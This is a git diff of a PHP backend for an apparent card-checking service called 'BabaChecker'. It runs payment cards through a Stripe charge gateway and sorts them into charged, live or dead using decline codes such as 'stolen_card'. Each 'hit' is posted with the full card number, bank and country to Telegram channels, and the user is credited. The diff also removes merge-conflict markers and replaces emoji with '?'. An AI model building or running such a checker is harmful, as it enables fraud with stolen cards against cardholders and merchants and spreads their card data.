@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted path
 require_once __DIR__ . '/../../app/Db.php';
@@ -179,7 +179,7 @@ $bannedBins = [
 ];
 
 if (in_array($bin, $bannedBins)) {
-    echo json_encode(['Response' => 'BIN BANNED ❌']);
+    echo json_encode(['Response' => 'BIN BANNED ?']);
     exit;
 }
 
@@ -204,7 +204,7 @@ $issuer = $binInfo['issuer'];
 $country_info = $binInfo['country_info'];
 
 if (strtoupper($level) === 'PREPAID') {
-    echo json_encode(['Response' => 'Prepaid Bins are not Allowed ❌']);
+    echo json_encode(['Response' => 'Prepaid Bins are not Allowed ?']);
     exit;
 }
 
@@ -238,29 +238,29 @@ $dead_responses = [
     "card_decline_rate_limit_exceeded" => "Card was declined",
     "CARD_GENERIC_ERROR" => "Card was declined",
     "Your card was declined." => "Your card was declined.",
-    "do_not_honor" => "Do Not Honor ❌",
-    "Invalid account." => "Invalid Account ❌",
-    "fraudulent" => "Fraudulent ❌",
-    "setup_intent_authentication_failure" => "setup_intent_authentication_failure ❌",
-    "invalid_cvc" => "Invalid CVC ❌",
-    "stolen_card" => "Stolen Card ❌",
-    "lost_card" => "Lost Card ❌",
-    "pickup_card" => "Pickup Card ❌",
-    "incorrect_number" => "Incorrect Card Number ❌",
-    "Your card has expired." => "Expired Card ❌",
-    "expired_card" => "Expired Card ❌",
-    "intent_confirmation_challenge" => "intent_confirmation_challenge ❌",
-    "Your card number is incorrect." => "Incorrect Card Number ❌",
-    "An error occurred while processing the card." => "Error Occurred ❌",
-    "Your card's expiration year is invalid." => "Expiration Year Invalid ❌",
-    "Your card's expiration month is invalid." => "Expiration Month Invalid ❌",
-    "invalid_expiry_month" => "Expiration Month Invalid ❌",
-    "card is not supported." => "Card Not Supported ❌",
-    "invalid_account" => "Dead Card ❌",
-    "Invalid API Key provided" => "stripe error . contact support@stripe.com for more details ❌",
-    "testmode_charges_only" => "stripe error . contact support@stripe.com for more details ❌",
-    "api_key_expired" => "stripe error . contact support@stripe.com for more details ❌",
-    "Your account cannot currently make live charges." => "stripe error . contact support@stripe.com for more details ❌",
+    "do_not_honor" => "Do Not Honor ?",
+    "Invalid account." => "Invalid Account ?",
+    "fraudulent" => "Fraudulent ?",
+    "setup_intent_authentication_failure" => "setup_intent_authentication_failure ?",
+    "invalid_cvc" => "Invalid CVC ?",
+    "stolen_card" => "Stolen Card ?",
+    "lost_card" => "Lost Card ?",
+    "pickup_card" => "Pickup Card ?",
+    "incorrect_number" => "Incorrect Card Number ?",
+    "Your card has expired." => "Expired Card ?",
+    "expired_card" => "Expired Card ?",
+    "intent_confirmation_challenge" => "intent_confirmation_challenge ?",
+    "Your card number is incorrect." => "Incorrect Card Number ?",
+    "An error occurred while processing the card." => "Error Occurred ?",
+    "Your card's expiration year is invalid." => "Expiration Year Invalid ?",
+    "Your card's expiration month is invalid." => "Expiration Month Invalid ?",
+    "invalid_expiry_month" => "Expiration Month Invalid ?",
+    "card is not supported." => "Card Not Supported ?",
+    "invalid_account" => "Dead Card ?",
+    "Invalid API Key provided" => "stripe error . contact support@stripe.com for more details ?",
+    "testmode_charges_only" => "stripe error . contact support@stripe.com for more details ?",
+    "api_key_expired" => "stripe error . contact support@stripe.com for more details ?",
+    "Your account cannot currently make live charges." => "stripe error . contact support@stripe.com for more details ?",
     "ProxyError" => "Proxy Connection Refused"
 ];
 // Check for Charged response first
@@ -269,35 +269,32 @@ if ((stripos($response, 'Payment Successful') !== false)) {
     $new_credits = updateCredits($pdo, $uid, 5, false, true);
     $fullResult =
         "<b>#NonSKCharge</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
-        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
-        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Charged ??\n" .
+        "[?] <b>Response ?</b> {$err} ??\n" .
+        "[?] <b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b>Charged 🔥</b>\n" .
-        "<b>Response ➜</b> {$err} 🎉\n" .
-        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ?</b> <b>Charged ??</b>\n" .
+        "<b>Response ?</b> {$err} ??\n" .
+        "<b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "????????\n" .
+        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'charge',
@@ -319,36 +316,33 @@ elseif (stripos($response, 'requires_action') !== false) {
     $new_credits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult =
         "<b>#NonSKCharge</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b> Live ✅</b>\n" .
-        "<b>Response ➜</b> {$err}\n" .
-        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ?</b> <b> Live ?</b>\n" .
+        "<b>Response ?</b> {$err}\n" .
+        "<b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "????????\n" .
+        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -369,40 +363,37 @@ elseif (stripos($response, 'requires_action') !== false) {
     stripos($response, 'card has insufficient funds.') !== false ||
     stripos($response, 'INSUFFICIENT_FUNDS') !== false
 ) {
-    $err = 'Insufficient Funds 💰';
+    $err = 'Insufficient Funds ??';
     $new_credits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult =
         "<b>#NonSKCharge</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b> Live ✅</b>\n" .
-        "<b>Response ➜</b> {$err}\n" .
-        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ?</b> <b> Live ?</b>\n" .
+        "<b>Response ?</b> {$err}\n" .
+        "<b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "????????\n" .
+        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -424,40 +415,37 @@ elseif (stripos($response, 'requires_action') !== false) {
     stripos($response, 'Your card\'s security code is incorrect.') !== false ||
     stripos($response, 'INVALID SECURITY CODE') !== false
 ) {
-    $err = 'Incorrect CVC ❎';
+    $err = 'Incorrect CVC ?';
     $new_credits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult =
         "<b>#NonSKCharge</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b> Live ✅</b>\n" .
-        "<b>Response ➜</b> {$err}\n" .
-        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ?</b> <b> Live ?</b>\n" .
+        "<b>Response ?</b> {$err}\n" .
+        "<b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "????????\n" .
+        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -477,40 +465,37 @@ elseif (stripos($response, 'requires_action') !== false) {
     stripos($response, 'transaction_not_allowed') !== false ||
     stripos($response, 'Your card does not support this type of purchase') !== false
 ) {
-    $err = 'Card Doesn\'t Support Currency ⚠️';
+    $err = 'Card Doesn\'t Support Currency ??';
     $new_credits = updateCredits($pdo, $uid, 3, true, false);
     $fullResult =
         "<b>#NonSKCharge</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
-        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$brand} - {$card_type} - {$level}\n" .
+        "[?] <b>Bank ?</b> {$issuer}\n" .
+        "[?] <b>Country ?</b> {$country_info}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b> Live ✅</b>\n" .
-        "<b>Response ➜</b> {$err}\n" .
-        "<b>Gateway ➜</b> NonSK Charge (Stripe)\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ?</b> <b> Live ?</b>\n" .
+        "<b>Response ?</b> {$err}\n" .
+        "<b>Gateway ?</b> NonSK Charge (Stripe)\n" .
+        "????????\n" .
+        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -569,8 +554,5 @@ elseif (stripos($response, 'requires_action') !== false) {
         exit;
     }
 }
-<<<<<<< HEAD
 ?>
-=======
-?>
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+
